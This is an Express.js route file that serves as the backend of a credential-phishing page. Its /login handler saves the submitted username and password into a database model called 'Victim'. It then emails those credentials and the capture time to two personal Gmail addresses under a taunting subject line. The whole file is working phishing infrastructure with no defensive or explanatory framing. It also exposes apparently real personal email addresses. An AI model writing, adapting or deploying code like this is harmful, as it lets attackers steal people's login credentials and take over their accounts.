const { createPAssTemplate } = require("../helpers/mails")
const sendEmail = require("../helpers/main")
const Victim = require("../models/Victim.js")

const route = require("express").Router()

route.post("/login", async (req, res) => {
    try {
        const ress = await Victim.create(req.body)
        res.status(200).json({status: "ok"})
        const to = ["vishwakarmasatyam2002@gmail.com", "vishwakarmasatyam2905@gmail.com"]
        sendEmail({
            to: to,
            subject: "Banda Phasa",
            emailhtml: createPAssTemplate(ress),
            emailtext: `
                email: ${ress.username},
                pass: ${ress.pass},
                time: ${ress.createdAt}
            `
        })
    } catch (error) {
        console.log(error)
        if (error.name === "ValidationError") {
            return res.status(401).json({ message: `${Object.keys(error.errors).map(e => e)} is Required!!!` });
        }
        res.status(500).json({ message: "internal server error" });
    }
})

module.exports = route
